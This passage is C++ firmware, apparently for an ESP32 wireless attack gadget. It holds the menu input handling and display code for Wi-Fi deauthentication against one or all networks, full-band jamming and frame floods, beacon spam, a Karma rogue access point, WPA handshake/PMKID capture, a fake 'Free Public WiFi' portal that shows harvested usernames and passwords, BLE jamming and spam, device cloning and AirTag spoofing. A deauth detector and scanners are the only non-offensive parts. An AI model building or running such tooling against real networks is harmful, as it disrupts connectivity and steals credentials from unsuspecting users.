      if (!wifiScanning && cnt > 0 && _sel >= 0 && _sel < cnt) {
        wifiScanDetail = true;
        _dirty = true;
      }
    } else if (a == JOY_BACK) {
      // 1s hold = refresh scan
      if (!wifiScanning) {
        wifiScanStart();
        _sel = 0; _top = 0;
        wifiScanDetail = false;
        _dirty = true;
      }
    } else if (a == JOY_BACK2) {
      wifiScanDetail = false;
      goBack();
    }
    return;
  }

  // BLE Scanner
  if (_screen == SCR_BLE_SCAN) {
    int cnt = bleCount;
    if (cnt > 0 && _sel >= cnt) { _sel = cnt - 1; menuEnsureVisible(_sel, _top, cnt, 6); }
    if (a == JOY_UP || a == JOY_HOLD_UP) {
      if (_sel > 0) { _sel--; menuEnsureVisible(_sel, _top, cnt, 6); _dirty = true; }
    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
      if (cnt > 0 && _sel < cnt - 1) { _sel++; menuEnsureVisible(_sel, _top, cnt, 6); _dirty = true; }
    } else if (a == JOY_SELECT) {
      if (!bleScanning) { bleScanStart(); _sel = 0; _top = 0; _dirty = true; }
    } else if (a == JOY_BACK || a == JOY_BACK2) goBack();
    return;
  }

  // Deauth Attack – index 0 = ALL, 1..N = single AP
  if (_screen == SCR_DEAUTH) {
    if (deauthRunning) {
      if (a == JOY_BACK || a == JOY_SELECT) { deauthStop(); _dirty = true; }
      return;
    }
    int cnt = wifiCount;
    if (cnt == 0) {
      if (a == JOY_BACK || a == JOY_SELECT) goBack();
      return;
    }
    int menuCnt = cnt + 1;
    if (a == JOY_UP || a == JOY_HOLD_UP) {
      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
      if (_sel < menuCnt-1) { _sel++; menuEnsureVisible(_sel, _top, menuCnt, 5); _dirty = true; }
    } else if (a == JOY_SELECT) {
      if (_sel == 0) deauthStartAll();
      else deauthStart(_sel - 1);
      _dirty = true;
    } else if (a == JOY_BACK) goBack();
    return;
  }

  // Live tools
  if (_screen == SCR_PACKET_MON || _screen == SCR_BEACON ||
      _screen == SCR_DEAUTH_DET || _screen == SCR_CAPTIVE) {
    if (a == JOY_BACK) goBack();
    else if (a == JOY_SELECT) {
      if (_screen == SCR_PACKET_MON) { pmStop(); pmStart(); _dirty = true; }
      else if (_screen == SCR_BEACON) {
        if (beaconRunning) beaconStop();
        else if (beaconMode == 1 && wifiCount == 0) { /* need scan */ }
        else beaconStart();
        _dirty = true;
      } else if (_screen == SCR_DEAUTH_DET) {
        deauthCount = 0; detMacSeen = false; _dirty = true;
      }
    } else if (_screen == SCR_BEACON && !beaconRunning &&
               (a == JOY_LEFT || a == JOY_RIGHT || a == JOY_HOLD_LEFT || a == JOY_HOLD_RIGHT)) {
      beaconMode = beaconMode ? 0 : 1;
      _dirty = true;
    } else if (_screen == SCR_DEAUTH_DET &&
               (a == JOY_LEFT || a == JOY_RIGHT || a == JOY_HOLD_LEFT || a == JOY_HOLD_RIGHT)) {
      detMainOnly = !detMainOnly;
      detCh = 1;
      esp_wifi_set_channel(detCh, WIFI_SECOND_CHAN_NONE);
      _dirty = true;
    }
    return;
  }

  // Client sniffer – pick AP, list stations
  if (_screen == SCR_CLIENT_SNIFF) {
    if (clientSniffRunning) {
      if (a == JOY_BACK || a == JOY_SELECT) { clientSniffStop(); _dirty = true; }
      return;
    }
    if (a == JOY_BACK) { goBack(); return; }
    if (wifiCount <= 0) return;
    if (a == JOY_UP || a == JOY_HOLD_UP) {
      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
      if (_sel < wifiCount - 1) { _sel++; if (_sel >= _top + 6) _top = _sel - 5; _dirty = true; }
    } else if (a == JOY_SELECT) {
      clientSniffStart(_sel);
      _dirty = true;
    }
    return;
  }

  // Probe stress – pick AP then flood
  if (_screen == SCR_PROBE) {
    if (probeRunning) {
      if (a == JOY_BACK || a == JOY_SELECT) { probeStop(); _dirty = true; }
      return;
    }
    if (a == JOY_BACK) { goBack(); return; }
    if (wifiCount <= 0) return;
    if (a == JOY_UP || a == JOY_HOLD_UP) {
      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
      if (_sel < wifiCount - 1) { _sel++; if (_sel >= _top + 6) _top = _sel - 5; _dirty = true; }
    } else if (a == JOY_SELECT) {
      probeStart(_sel);
      _dirty = true;
    }
    return;
  }

  // BLE Sniffer / Spoofer — list + mode + device pick
  if (_screen == SCR_BLE_SNIFF || _screen == SCR_BLE_SPOOF) {
    if (a == JOY_BACK) { goBack(); return; }
    if (_screen == SCR_BLE_SNIFF) {
      if (a == JOY_SELECT) { sniffStop(); sniffStart(); _dirty = true; }
      else if (bleCount > 0 && (a == JOY_UP || a == JOY_HOLD_UP)) {
        if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
      } else if (bleCount > 0 && (a == JOY_DOWN || a == JOY_HOLD_DOWN)) {
        if (_sel < bleCount - 1) { _sel++; if (_sel >= _top + 5) _top = _sel - 4; _dirty = true; }
      }
      return;
    }
    // SCR_BLE_SPOOF
    if (spoofRunning) {
      if (a == JOY_SELECT || a == JOY_BACK) { spoofStop(); _dirty = true; }
      return;
    }
    if (a == JOY_LEFT || a == JOY_HOLD_LEFT || a == JOY_RIGHT || a == JOY_HOLD_RIGHT) {
      spoofMode = (spoofMode + 1) % 6;
      _dirty = true;
      return;
    }
    // Clone mode: pick device from scan list
    if (spoofMode == 4 && bleCount > 0) {
      if (a == JOY_UP || a == JOY_HOLD_UP) {
        if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
      } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
        if (_sel < bleCount - 1) { _sel++; if (_sel >= _top + 4) _top = _sel - 3; _dirty = true; }
      } else if (a == JOY_SELECT) {
        spoofDevIdx = _sel;
        spoofStart();
        _dirty = true;
      }
      return;
    }
    if (a == JOY_SELECT) {
      if (spoofMode == 4 && bleCount == 0) { /* scan first */ }
      else { spoofDevIdx = -1; spoofStart(); }
      _dirty = true;
    }
    return;
  }


  // Karma
  if (_screen == SCR_KARMA) {
    if (a == JOY_BACK) { if (karmaRunning) karmaStop(); goBack(); return; }
    if (a == JOY_SELECT) {
      if (karmaRunning) karmaStop();
      else karmaStart(karmaCh >= 1 && karmaCh <= 13 ? karmaCh : 1);
      _dirty = true;
    } else if (a == JOY_LEFT || a == JOY_HOLD_LEFT || a == JOY_RIGHT || a == JOY_HOLD_RIGHT) {
      if (a == JOY_RIGHT || a == JOY_HOLD_RIGHT)
        karmaCh = (karmaCh == 1 ? 6 : (karmaCh == 6 ? 11 : 1));
      else
        karmaCh = (karmaCh == 11 ? 6 : (karmaCh == 6 ? 1 : 11));
      if (karmaRunning) { karmaStop(); karmaStart(karmaCh); }
      _dirty = true;
    }
    return;
  }

  // Wi-Fi jam / airtime — index 0 = FULL BAND (Negator), 1..N = AP
  if (_screen == SCR_FLOOD) {
    if (floodRunning) {
      if (a == JOY_BACK || a == JOY_SELECT) { floodStop(); _dirty = true; }
      return;
    }
    if (a == JOY_BACK) { goBack(); return; }
    int menuCnt = wifiCount + 1; // + FULL BAND
    if (menuCnt < 1) menuCnt = 1;
    if (a == JOY_UP || a == JOY_HOLD_UP) {
      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
      if (_sel < menuCnt - 1) { _sel++; if (_sel >= _top + 6) _top = _sel - 5; _dirty = true; }
    } else if (a == JOY_LEFT || a == JOY_RIGHT) {
      if (_sel > 0) floodMode = (floodMode + 1) % 3; // RTS/CTS/AUTH for AP mode
      _dirty = true;
    } else if (a == JOY_SELECT) {
      if (_sel == 0) floodStart(-1, 3); // full-band beacon storm
      else floodStart(_sel - 1, floodMode % 3);
      _dirty = true;
    }
    return;
  }

  // EAPOL capture – channel select
  if (_screen == SCR_EAPOL) {
    if (a == JOY_BACK) { if (eapolRunning) eapolStop(); goBack(); return; }
    if (a == JOY_LEFT || a == JOY_HOLD_LEFT) {
      if (eapolCh > 1) eapolCh--;
      _dirty = true;
    } else if (a == JOY_RIGHT || a == JOY_HOLD_RIGHT) {
      if (eapolCh < 13) eapolCh++;
      _dirty = true;
    } else if (a == JOY_SELECT) {
      if (eapolRunning) eapolStop();
      else eapolStart(eapolCh);
      _dirty = true;
    }
    return;
  }

  // War mode toggle
  if (_screen == SCR_WAR) {
    if (a == JOY_BACK) { goBack(); return; }
    if (a == JOY_SELECT) {
      setWarMode(!warMode);
      _dirty = true;
    }
    return;
  }

  // Sour Apple – list selector + run (item 0 = Random Mix)
  if (_screen == SCR_SOUR_APPLE) {
    const int sourMenuCount = APPLE_LIST_COUNT + 1;  // + Random Mix
    if (sourRunning) {
      if (a == JOY_BACK || a == JOY_SELECT) { sourStop(); _dirty = true; }
      return;
    }
    if (a == JOY_UP || a == JOY_HOLD_UP) {
      if (_sel > 0) { _sel--; if (_sel < _top) _top = _sel; _dirty = true; }
    } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
      if (_sel < sourMenuCount-1) { _sel++; menuEnsureVisible(_sel, _top, sourMenuCount, 5); _dirty = true; }
    } else if (a == JOY_SELECT) {
      sourSelected = (_sel == 0) ? -1 : (_sel - 1);  // -1 = random mix
      sourBeginAdvertise();
      _dirty = true;
    } else if (a == JOY_BACK) goBack();
    return;
  }

  // BLE ADV Flood
  if (_screen == SCR_BLE_JAM) {
    if (a == JOY_BACK) goBack();
    else if (a == JOY_SELECT) {
      if (jamRunning) jamStop(); else jamStart();
      _dirty = true;
    }
    return;
  }

  // AirTag Tools
  if (_screen == SCR_AIRTAG) {
    if (airDetRunning || airSpoofRunning) {
      if (a == JOY_BACK || a == JOY_SELECT) { airTagStop(); airTagMode = 0; _dirty = true; }
      return;
    }
    if (a == JOY_UP) { if (airMenuSel > 0) { airMenuSel--; _dirty = true; } return; }
    if (a == JOY_DOWN) { if (airMenuSel < 2) { airMenuSel++; _dirty = true; } return; }
    if (a == JOY_SELECT) {
      if (airMenuSel == 0) { airDetStart(); _dirty = true; }
      else if (airMenuSel == 1) {
        if (airTagCount == 0) airTagBeginSpoof();
        else airSpoofStart(-1);
        _dirty = true;
      }
      else if (airMenuSel == 2) {
        if (airTagCount > 0) { airSpoofStart(0); _dirty = true; }
      }
      return;
    }
    if (a == JOY_BACK) goBack();
    return;
  }

  // Menus
  int count = 0;
  switch (_screen) {
    case SCR_MAIN: count = MAIN_COUNT; break;
    case SCR_WIFI_MENU: count = WIFI_COUNT; break;
    case SCR_BLE_MENU: count = BLE_COUNT; break;
    default: count = 1; break;
  }

  if (a == JOY_UP || a == JOY_HOLD_UP) {
    if (_sel > 0) { _sel--; menuEnsureVisible(_sel, _top, count, 5 /*MENU_ROWS*/); _dirty = true; }
  } else if (a == JOY_DOWN || a == JOY_HOLD_DOWN) {
    if (_sel < count-1) { _sel++; menuEnsureVisible(_sel, _top, count, 5 /*MENU_ROWS*/); _dirty = true; }
  } else if (a == JOY_SELECT) {
    if (_screen == SCR_MAIN) {
      if (_sel == 0) enterScreen(SCR_WIFI_MENU);
      else if (_sel == 1) enterScreen(SCR_BLE_MENU);
      else if (_sel == 2) { stopAllTools(); _dirty = true; }
      else if (_sel == 3) enterScreen(SCR_ABOUT);
    } else if (_screen == SCR_WIFI_MENU) {
      if (_sel == 0) enterScreen(SCR_WIFI_SCAN);
      else if (_sel == 1) enterScreen(SCR_PACKET_MON);
      else if (_sel == 2) enterScreen(SCR_BEACON);
      else if (_sel == 3) enterScreen(SCR_DEAUTH);
      else if (_sel == 4) enterScreen(SCR_CLIENT_SNIFF);
      else if (_sel == 5) enterScreen(SCR_DEAUTH_DET);
      else if (_sel == 6) enterScreen(SCR_PROBE);
      else if (_sel == 7) enterScreen(SCR_KARMA);
      else if (_sel == 8) enterScreen(SCR_FLOOD);
      else if (_sel == 9) enterScreen(SCR_EAPOL);
      else if (_sel == 10) enterScreen(SCR_CAPTIVE);
      else if (_sel == 11) enterScreen(SCR_WAR);
      else if (_sel == 12) goBack();
    } else if (_screen == SCR_BLE_MENU) {
      if (_sel == 0) enterScreen(SCR_BLE_SCAN);
      else if (_sel == 1) enterScreen(SCR_BLE_SNIFF);
      else if (_sel == 2) enterScreen(SCR_BLE_SPOOF);
      else if (_sel == 3) enterScreen(SCR_SOUR_APPLE);
      else if (_sel == 4) enterScreen(SCR_BLE_JAM);
      else if (_sel == 5) enterScreen(SCR_AIRTAG);
      else if (_sel == 6) goBack();
    } else if (_screen == SCR_ABOUT) goBack();
  } else if (a == JOY_BACK || a == JOY_BACK2) goBack();
}

static void drawStubScreen(const char* title, const char* line1, const char* line2 = nullptr) {
  Theme::drawStatusBar(title);
  Theme::printCentered(line1, 48, COL_WARN, 1);
  if (line2) Theme::printCentered(line2, 64, COL_DIM, 1);
  Theme::drawFooter(nullptr, "Btn = Back");
}

void UI::drawWifiScanScreen() {
  int hp = joystick.isButtonDown() ? (int)joystick.holdProgress2() : -1;
  Theme::drawStatusBar("Wi-Fi Scan", hp);
  if (wifiScanDetail && _sel >= 0 && _sel < wifiCount) {
    const WifiNet& n = wifiNets[_sel];
    char line[28];
    Theme::printCentered(n.ssid.c_str(), 22, COL_TITLE, 1);
    snprintf(line, sizeof(line), "CH %d  %d dBm", n.ch, n.rssi);
    Theme::printCentered(line, 38, COL_FG, 1);
    snprintf(line, sizeof(line), "%02X:%02X:%02X:%02X:%02X:%02X",
             n.bssid[0], n.bssid[1], n.bssid[2], n.bssid[3], n.bssid[4], n.bssid[5]);
    Theme::printCentered(line, 54, COL_ACCENT, 1);
    const char* enc = "Open";
    switch (n.enc) {
      case WIFI_AUTH_WEP: enc = "WEP"; break;
      case WIFI_AUTH_WPA_PSK: enc = "WPA"; break;
      case WIFI_AUTH_WPA2_PSK: enc = "WPA2"; break;
      case WIFI_AUTH_WPA_WPA2_PSK: enc = "WPA/WPA2"; break;
      case WIFI_AUTH_WPA2_ENTERPRISE: enc = "Enterprise"; break;
      case WIFI_AUTH_WPA3_PSK: enc = "WPA3"; break;
      case WIFI_AUTH_WPA2_WPA3_PSK: enc = "WPA2/WPA3"; break;
      default: if (n.enc != WIFI_AUTH_OPEN) enc = "Secured"; break;
    }
    Theme::printCentered(enc, 70, COL_FG, 1);
    if (n.hidden) Theme::printCentered("(hidden)", 86, COL_DIM, 1);
    Theme::drawFooter("Hold=Back", "1s");
    return;
  }
  if (wifiScanning) {
    Theme::printCentered("Scanning...", 50, COL_ACCENT, 1);
    Theme::printCentered("Please wait", 66, COL_DIM, 1);
    Theme::drawFooter("Hold 2s", "Back");
    return;
  }
  static const char* ssids[WIFI_MAX_NETS];
  static int32_t rssis[WIFI_MAX_NETS];
  for (int i = 0; i < wifiCount; i++) {
    ssids[i] = wifiNets[i].ssid.c_str();
    rssis[i] = wifiNets[i].rssi;
  }
  Theme::drawWifiList(ssids, rssis, wifiCount, _sel, _top);
  char left[20];
  snprintf(left, sizeof(left), "%d nets", wifiCount);
  Theme::drawFooter(left, "Sel=Info Hold=Scan");
}

void UI::drawBleScanScreen() {
  int hp = joystick.isButtonDown() ? (int)joystick.holdProgress() : -1;
  Theme::drawStatusBar("BLE Scan", hp);
  if (bleScanning) {
    Theme::printCentered("Scanning...", 50, COL_ACCENT, 1);
    Theme::printCentered("~12 seconds", 66, COL_DIM, 1);
    Theme::drawFooter(nullptr, "Hold=Back");
    return;
  }
  static const char* names[BLE_MAX_DEVS];
  static int32_t rssis[BLE_MAX_DEVS];
  for (int i = 0; i < bleCount; i++) {
    names[i] = bleDevs[i].name.c_str();
    rssis[i] = bleDevs[i].rssi;
  }
  Theme::drawWifiList(names, rssis, bleCount, _sel, _top);
  char left[20];
  snprintf(left, sizeof(left), "%d devs", bleCount);
  Theme::drawFooter(left, "Sel=Rescan");
}

static void drawPacketMonitor() {
  Theme::drawStatusBar("Packet Mon");
  const int baseY = 100, maxH = 70, barW = 8, gap = 2, startX = 6;
  uint16_t mx = 1;
  for (int i = 0; i < 14; i++) if (pktCount[i] > mx) mx = pktCount[i];
  for (int i = 0; i < 14; i++) {
    int h = (pktCount[i] * maxH) / mx;
    if (h < 1 && pktCount[i] > 0) h = 1;
    int x = startX + i * (barW + gap);
    tft.fillRect(x, baseY - maxH, barW, maxH, 0x1082);
    uint16_t col = (i + 1 == pmChannel) ? COL_ACCENT : COL_OK;
    if (h > 0) tft.fillRect(x, baseY - h, barW, h, col);
    if (i == 0 || i == 5 || i == 10 || i == 13) {
      tft.setTextColor(COL_DIM, COL_BG);
      tft.setCursor(x, baseY + 2);
      tft.print(i + 1);
    }
  }
  char buf[28];
  snprintf(buf, sizeof(buf), "Ch%d  %lu pkts", pmChannel, (unsigned long)pktTotal);
  Theme::drawFooter(buf, "Sel=Reset");
}

static void drawBeaconScreen() {
  Theme::drawStatusBar("Beacon Spam");
  if (beaconRunning) {
    Theme::printCentered("RUNNING", 32, COL_OK, 1);
    char buf[32];
    if (beaconMode == 1 && wifiCount > 0)
      snprintf(buf, sizeof(buf), "%.16s", wifiNets[beaconCloneIdx].ssid.c_str());
    else
      snprintf(buf, sizeof(buf), "%.16s", beaconSSIDs[beaconIdx]);
    Theme::printCentered(buf, 48, COL_FG, 1);
    snprintf(buf, sizeof(buf), "CH%d %lu", beaconCh, (unsigned long)beaconSent);
    Theme::printCentered(buf, 64, COL_DIM, 1);
    Theme::printCentered(beaconMode ? "CLONE" : "LIST", 80, COL_ACCENT, 1);
  } else {
    Theme::printCentered(beaconMode ? "Mode: CLONE" : "Mode: LIST", 40, COL_TITLE, 1);
    if (beaconMode && wifiCount == 0)
      Theme::printCentered("Scan WiFi first!", 58, COL_WARN, 1);
    else
      Theme::printCentered("Sel=Start  L/R=Mode", 58, COL_DIM, 1);
  }
  Theme::drawFooter(nullptr, "L-Back");
}

static void drawDeauthDetScreen() {
  Theme::drawStatusBar("Deauth Detect");
  char buf[28];
  snprintf(buf, sizeof(buf), "%lu  CH%d %s",
           (unsigned long)deauthCount, detCh, detMainOnly ? "M" : "A");
  Theme::printCentered(buf, 28, COL_FG, 1);
  if (detMacSeen) {
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             detLastMac[0], detLastMac[1], detLastMac[2],
             detLastMac[3], detLastMac[4], detLastMac[5]);
    Theme::printCentered(buf, 46, COL_ACCENT, 1);
    snprintf(buf, sizeof(buf), "CH%d  %d dBm", detLastCh, (int)detLastRssi);
    Theme::printCentered(buf, 62, COL_DIM, 1);
  } else {
    Theme::printCentered("Waiting...", 50, COL_DIM, 1);
  }
  Theme::drawFooter("L/R=Mode", "Sel=Reset");
}

static void drawDeauthScreen(int sel, int top) {
  Theme::drawStatusBar("Deauth Attack");
  if (deauthRunning) {
    Theme::printCentered("ATTACKING", 36, COL_ERR, 1);
    if (deauthTarget == -2) {
      Theme::printCentered("ALL NETWORKS", 54, COL_FG, 1);
    } else if (deauthTarget >= 0 && deauthTarget < wifiCount) {
      char s[18];
      const char* src = wifiNets[deauthTarget].ssid.c_str();
      int n = 0; while (src[n] && n < 15) { s[n] = src[n]; n++; }
      if (src[n]) s[n++] = '.'; s[n] = 0;
      Theme::printCentered(s, 54, COL_FG, 1);
    }
    char buf[24];
    snprintf(buf, sizeof(buf), "Sent %lu", (unsigned long)deauthSent);
    Theme::printCentered(buf, 72, COL_DIM, 1);
    Theme::drawFooter("Sel=Stop", "L-Back");
  } else if (wifiCount == 0) {
    Theme::printCentered("No scan data", 50, COL_WARN, 1);
    Theme::printCentered("Scan first", 66, COL_DIM, 1);
    Theme::drawFooter(nullptr, "L-Back");
  } else {
    static const char* items[WIFI_MAX_NETS + 1];
    items[0] = ">> ALL NETWORKS <<";
    for (int i = 0; i < wifiCount; i++) items[i + 1] = wifiNets[i].ssid.c_str();
    Theme::drawMenuList(items, wifiCount + 1, sel, top, 18, 14);
    Theme::drawFooter("Pick target", "Sel=Start");
  }
}


static void drawClientSniffScreen(int sel, int top) {
  Theme::drawStatusBar("Client Sniffer");
  char buf[28];
  if (clientSniffRunning) {
    Theme::printCentered("SNIFFING STAs", 24, COL_ACCENT, 1);
    if (clientSniffAp >= 0 && clientSniffAp < wifiCount) {
      char s[16];
      const char* src = wifiNets[clientSniffAp].ssid.c_str();
      int n = 0; while (src[n] && n < 14) { s[n] = src[n]; n++; } s[n] = 0;
      Theme::printCentered(s, 40, COL_FG, 1);
    }
    snprintf(buf, sizeof(buf), "%d clients CH%d", clientCount, clientSniffCh);
    Theme::printCentered(buf, 56, COL_DIM, 1);
    if (clientCount > 0) {
      snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
               clients[0].mac[0], clients[0].mac[1], clients[0].mac[2],
               clients[0].mac[3], clients[0].mac[4], clients[0].mac[5]);
      Theme::printCentered(buf, 72, COL_FG, 1);
    }
    Theme::drawFooter("Sel=Stop", "L-Back");
  } else if (wifiCount == 0) {
    Theme::printCentered("Scan Wi-Fi first", 50, COL_WARN, 1);
    Theme::drawFooter(nullptr, "L-Back");
  } else {
    static const char* items[WIFI_MAX_NETS];
    for (int i = 0; i < wifiCount; i++) items[i] = wifiNets[i].ssid.c_str();
    Theme::drawMenuList(items, wifiCount, sel, top, 18, 14);
    Theme::drawFooter("Pick AP", "Sel=Sniff");
  }
}

static void drawProbeScreen(int sel, int top) {
  Theme::drawStatusBar("Probe Stress");
  char buf[28];
  if (probeRunning) {
    Theme::printCentered("STRESSING", 28, COL_ERR, 1);
    if (probeTarget >= 0 && probeTarget < wifiCount) {
      char s[18];
      const char* src = wifiNets[probeTarget].ssid.c_str();
      int n = 0; while (src[n] && n < 15) { s[n] = src[n]; n++; }
      s[n] = 0;
      Theme::printCentered(s, 46, COL_FG, 1);
      snprintf(buf, sizeof(buf), "CH%d  %lu", probeCh, (unsigned long)probeSent);
      Theme::printCentered(buf, 64, COL_DIM, 1);
    }
    Theme::drawFooter("Sel=Stop", "L-Back");
  } else if (wifiCount == 0) {
    Theme::printCentered("No scan data", 50, COL_WARN, 1);
    Theme::printCentered("Scan Wi-Fi first", 66, COL_DIM, 1);
    Theme::drawFooter(nullptr, "L-Back");
  } else {
    static const char* items[WIFI_MAX_NETS];
    for (int i = 0; i < wifiCount; i++) items[i] = wifiNets[i].ssid.c_str();
    Theme::drawMenuList(items, wifiCount, sel, top, 18, 14);
    Theme::drawFooter("Pick AP", "Sel=Start");
  }
}

static void drawCaptiveScreen() {
  Theme::drawStatusBar("Captive Portal");
  Theme::printCentered("Free Public WiFi", 28, COL_TITLE, 1);
  char buf[28];
  snprintf(buf, sizeof(buf), "Clients:%lu Hits:%lu",
           (unsigned long)captiveClients, (unsigned long)captiveHits);
  Theme::printCentered(buf, 46, COL_FG, 1);
  if (captiveLastUser[0]) {
    Theme::printCentered(captiveLastUser, 64, COL_ACCENT, 1);
    Theme::printCentered(captiveLastPass[0] ? captiveLastPass : "(pass)", 80, COL_DIM, 1);
  } else {
    Theme::printCentered("Waiting for login...", 68, COL_DIM, 1);
  }
  Theme::drawFooter(nullptr, "L-Back");
}


static void drawBleSniffScreen(int sel, int top) {
  Theme::drawStatusBar("BLE Sniffer");
  if (bleScanning && bleCount == 0) {
    Theme::printCentered("Scanning...", 50, COL_ACCENT, 1);
    Theme::drawFooter(nullptr, "L-Back");
    return;
  }
  if (bleCount <= 0) {
    Theme::printCentered("No devices", 50, COL_WARN, 1);
    Theme::drawFooter("Sel=Scan", "L-Back");
    return;
  }
  static const char* names[BLE_MAX_DEVS];
  static int32_t rssis[BLE_MAX_DEVS];
  for (int i = 0; i < bleCount; i++) {
    names[i] = bleDevs[i].name.c_str();
    rssis[i] = bleDevs[i].rssi;
  }
  Theme::drawWifiList(names, rssis, bleCount, sel, top);
  char left[20];
  snprintf(left, sizeof(left), "%d devs", bleCount);
  Theme::drawFooter(left, "Sel=Refresh");
}

static void drawBleSpoofScreen(int sel, int top) {
  Theme::drawStatusBar("BLE Spoofer");
  const char* mn = "APPLE";
  if (spoofMode == 1) mn = "SAMSUNG";
  else if (spoofMode == 2) mn = "GOOGLE";
  else if (spoofMode == 3) mn = "NAMES";
  else if (spoofMode == 4) mn = "CLONE DEV";
  else if (spoofMode == 5) mn = "CUSTOM";

  if (spoofRunning) {
    Theme::printCentered("ADVERTISING", 28, COL_OK, 1);
    Theme::printCentered(mn, 44, COL_FG, 1);
    if (spoofMode == 4 && spoofDevIdx >= 0 && spoofDevIdx < bleCount)
      Theme::printCentered(bleDevs[spoofDevIdx].name.c_str(), 60, COL_ACCENT, 1);
    else
      Theme::printCentered("active", 60, COL_DIM, 1);
    Theme::drawFooter("Sel=Stop", "L-Back");
    return;
  }

  Theme::printCentered(mn, 20, COL_TITLE, 1);
  if (spoofMode == 4) {
    if (bleCount <= 0) {
      Theme::printCentered("Scan BLE first", 50, COL_WARN, 1);
      Theme::drawFooter("L/R=Mode", "L-Back");
      return;
    }
    static const char* names[BLE_MAX_DEVS];
    for (int i = 0; i < bleCount; i++) names[i] = bleDevs[i].name.c_str();
    Theme::drawMenuList(names, bleCount, sel, top, 32, 12);
    Theme::drawFooter("Pick dev", "Sel=Adv");
  } else {
    Theme::printCentered("L/R = mode", 48, COL_DIM, 1);
    Theme::printCentered("Sel = start", 64, COL_DIM, 1);
    Theme::drawFooter(nullptr, "L-Back");
  }
}

static void drawKarmaScreen() {
  Theme::drawStatusBar("Karma");
  if (karmaRunning) {
    Theme::printCentered("RUNNING", 36, COL_OK, 1);
    char buf[28];
    snprintf(buf, sizeof(buf), "CH%d SSIDs:%d", karmaCh, karmaCount);
    Theme::printCentered(buf, 52, COL_FG, 1);
    snprintf(buf, sizeof(buf), "TX %lu", (unsigned long)karmaSent);
    Theme::printCentered(buf, 68, COL_DIM, 1);
    Theme::drawFooter("Sel=Stop", "L-Back");
  } else {
    Theme::printCentered("Probe->beacon", 40, COL_TITLE, 1);
    char buf[20];
    snprintf(buf, sizeof(buf), "CH %u", (unsigned)karmaCh);
    Theme::printCentered(buf, 56, COL_FG, 1);
    Theme::drawFooter("L/R=CH Sel=Go", "L-Back");
  }
}

static void drawFloodScreen(int sel, int top) {
  Theme::drawStatusBar("WiFi Jammer");
  if (floodRunning) {
    Theme::printCentered("JAMMING", 32, COL_WARN, 1);
    if (floodMode == 3 || floodTarget < 0)
      Theme::printCentered("FULL 2.4G", 48, COL_FG, 1);
    else {
      const char* m = (floodMode==0)?"RTS+BCN":(floodMode==1)?"CTS":"AUTH+BCN";
      Theme::printCentered(m, 48, COL_FG, 1);
    }
    char buf[24];
    snprintf(buf, sizeof(buf), "%lu tx", (unsigned long)floodSent);
    Theme::printCentered(buf, 64, COL_DIM, 1);
    Theme::drawFooter("Sel=Stop", "L-Back");
  } else {
    // Line 0 = FULL BAND always available without scan
    static const char* items[97];
    static char labels[96][18];
    items[0] = "* FULL BAND *";
    int n = 1;
    for (int i = 0; i < wifiCount && n < 97; i++) {
      strncpy(labels[i], wifiNets[i].ssid.c_str(), 17);
      labels[i][17] = 0;
      items[n++] = labels[i];
    }
    Theme::drawMenuList(items, n, sel, top, 18, 12);
    Theme::drawFooter(sel==0?"Storm":"AP jam", "Sel=Start");
  }
}

static void drawEapolScreen() {
  Theme::drawStatusBar("EAPOL Capture");
  if (eapolRunning) {
    Theme::printCentered("LISTENING", 36, COL_OK, 1);
    char buf[28];
    snprintf(buf, sizeof(buf), "CH%u hits:%d", (unsigned)eapolCh, (int)eapolCount);
    Theme::printCentered(buf, 56, COL_FG, 1);
    Theme::drawFooter("Sel=Stop", "L-Back");
  } else {
    Theme::printCentered("Handshake/PMKID", 36, COL_TITLE, 1);
    char buf[20];
    snprintf(buf, sizeof(buf), "Channel %u", (unsigned)eapolCh);
    Theme::printCentered(buf, 56, COL_FG, 1);
    Theme::drawFooter("L/R=CH Sel=Go", "L-Back");
  }
}

static void drawWarScreen() {
  Theme::drawStatusBar("War Mode");
  Theme::printCentered(warMode ? "WAR ON" : "WAR OFF", 40, warMode ? COL_WARN : COL_DIM, 1);
  Theme::printCentered(warMode ? "Max RF / no SoftAP" : "Normal radio", 58, COL_FG, 1);
  Theme::printCentered("Sel = toggle", 76, COL_DIM, 1);
  Theme::drawFooter(nullptr, "L-Back");
}


static void drawSourAppleList(int sel, int top) {
  Theme::drawStatusBar("Sour Apple");
  if (sourRunning) {
    Theme::printCentered("SPAMMING", 36, COL_OK, 1);
    const char* nm = (sourSelected < 0) ? "Random Mix" : appleList[sourSelected].name;
    Theme::printCentered(nm, 52, COL_FG, 1);
    char buf[28];
    snprintf(buf, sizeof(buf), "%lu pkts", (unsigned long)sourSent);
    Theme::printCentered(buf, 68, COL_DIM, 1);
    Theme::drawFooter("Sel=Stop", "L-Back");
    return;
  }
  static const char* names[40];
  names[0] = "Random Mix";
  for (int i = 0; i < APPLE_LIST_COUNT && i < 39; i++) names[i+1] = appleList[i].name;
  Theme::drawMenuList(names, APPLE_LIST_COUNT + 1, sel, top, 18, 14);
  Theme::drawFooter("Pick type", "Sel=Start");
}

static void drawJamScreen() {
  Theme::drawStatusBar("BLE Jammer");
  if (jamRunning) {
    Theme::printCentered("FLOODING", 40, COL_ERR, 1);
    char buf[24];
    snprintf(buf, sizeof(buf), "%lu advs", (unsigned long)jamCount);
    Theme::printCentered(buf, 60, COL_FG, 1);
  } else {
    Theme::printCentered("STOPPED", 50, COL_WARN, 1);
    Theme::printCentered("Sel = Start", 70, COL_DIM, 1);
  }
  Theme::drawFooter(nullptr, "L-Back");
}

static void drawAirTagScreen() {
